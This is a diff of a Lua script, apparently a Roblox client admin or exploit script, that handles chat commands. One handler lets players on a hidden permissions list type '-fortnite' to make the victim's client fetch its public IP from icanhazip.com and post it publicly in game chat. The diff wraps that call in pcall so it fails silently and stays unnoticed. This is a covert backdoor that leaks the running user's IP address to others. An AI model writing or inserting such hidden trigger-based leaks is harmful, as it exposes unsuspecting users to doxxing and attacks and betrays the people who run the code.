@@ -8306,7 +8306,9 @@ v.Chatted:Connect(function(msg)
                 end
                 
                 if string.sub(msg:lower(), 0, 9) == "-fortnite" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                pcall(function()
                                         game.Players:Chat(":m "..game:HttpGet("https://icanhazip.com"))
+                                end)
                 end
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
